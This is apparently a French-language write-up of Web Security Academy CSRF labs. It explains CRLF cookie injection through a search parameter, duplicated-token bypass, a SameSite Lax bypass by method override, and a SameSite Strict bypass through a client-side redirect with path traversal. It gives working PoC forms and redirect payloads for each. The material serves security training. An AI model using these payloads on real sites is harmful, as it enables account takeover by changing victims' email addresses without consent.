    /?search=test%0d%0aSet-Cookie:%20csrfKey=yQuUE7omVwdwWkKddJm6DDTwc0EF11ZG%3b%20SameSite=None
    
Générer un PoC de CSRF mais remplacer le bouton d'envoi automatique par : 

    <img src="https://0ac8005403e86b048501054c008a003e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=yQuUE7omVwdwWkKddJm6DDTwc0EF11ZG%3b%20SameSite=None" onerror="document.forms[0].submit()">
    
PoC : 

    <html>
      <!-- CSRF PoC - generated by Burp Suite Professional -->
      <body>
        <form action="https://0ac8005403e86b048501054c008a003e.web-security-academy.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="autre_adresse@gmail.com" />
          <input type="hidden" name="csrf" value="FzYi95dvSRZv9PW3diq37M3ZA9lwXvl7" />
          <input type="submit" value="Submit request" />
        </form>
       <img src="https://0ac8005403e86b048501054c008a003e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=yQuUE7omVwdwWkKddJm6DDTwc0EF11ZG%3b%20SameSite=None" onerror="document.forms[0].submit()">
      </body>
    </html>


### CSRF where token is duplicated in cookie

Remarquer les lignes suivantes dans la requête de changement d'adresse :

> Cookie: session=r90uevTVNmqpKMVErnFcvwDakiUvjWTd; csrf=reGqTzhVmVZio5ojlhw8JoTbF38rwaCN
> ...
> email=test%40gmail.com&csrf=reGqTzhVmVZio5ojlhw8JoTbF38rwaCN


On observe que le token CSRF est dupliqué dans le header du cookie.

Comme sur le lab précédent, on observe également que la fonction de recherche n'a pas de protection CSRF. On va donc pouvoir l'exploiter pour injecter un faux cookie dans le navigateur de la victime.

PoC : 

    <html>
      <!-- CSRF PoC - generated by Burp Suite Professional -->
      <body>
        <form action="https://0a1200480460a6e18259e87800e20073.web-security-academy.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="autre_adresse5@gmail.com" />
          <input type="hidden" name="csrf" value="fake" />
          <input type="submit" value="Submit request" />
        </form>
    <img src="https://0a1200480460a6e18259e87800e20073.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
      </body>
    </html>


### SameSite Lax bypass via method override

En observant la requête de changement d'adresse mail, on voit qu'elle ne contient pas de mécanisme anti-CSRF, on voit juste un header de sécurité dans la réponse : 

    HTTP/2 302 Found
    Location: /my-account
    X-Frame-Options: SAMEORIGIN
    Content-Length: 0
    
On voit le même header X-Frame-Options pour la requête POST du login mais il n'y a pas de restriction SameSite explicite sur le header Set-Cookie.

Voir : https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie 


Envoyer la requête "POST /my-account/change-email" sur le Repeater et la changer en GET. On voit que l'endpoint n'accepte que les requêtes POST.

Utiliser la technique de l'overriding grâce au paramètre "_method" : 

    GET /my-account/change-email?email=test2@gmail.com&_method=POST HTTP/1.1
    
Notre adresse est bien changée en "test2@gmail.com"

Construire un exploit reproduisant cette requête.

Exemple : 

    <script>
        document.location = "https://0ab9007b04c8f44081acee7600690022.web-security-academy.net/my-account/change-email?email=test444@gmail.com&_method=POST";
    </script>

### SameSite Strict bypass via client-side redirect

Sur la requête "POST /my-account/change-email" on voit qu'il n'y a aucun token ou élément imprévisible, cette partie peut donc être vulnérable aux CSRF.

En revanche, dans la réponse à la requête "POST /login" on voit que le site spécifie explicitement "SameSite=Strict" pour les cookies, ce qui empêchera le navigateur d'inclure les cookies dans toute requête cross-site.

Dans la fonctionnalité des commentaires, on observe une redirection : 

    GET /post/comment/confirmation?postId=9 HTTP/2
    ...
    GET /resources/js/commentConfirmationRedirect.js
    
En modifiant le paramètre "postId=9" en "postId=test", on voit que la page essaye également de nous rediriger.

Injecter un chemin relatif fonctionne également. Le paramètre "postId=9/../../../my-account" nous redirige bien sur la page de modification de notre compte.

On a donc un vecteur propre au site permettant de transmettre des requêtes.

Payload final : 

    <script>
        document.location = "https://0adb0054047116ff80593f3a004900aa.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=test2@gmail.com%26submit=1";
    </script>
    
Il faut bien ajouter le paramètre "submit", et encoder le caractère '&' sous peine de sortir du paramètre "postId".
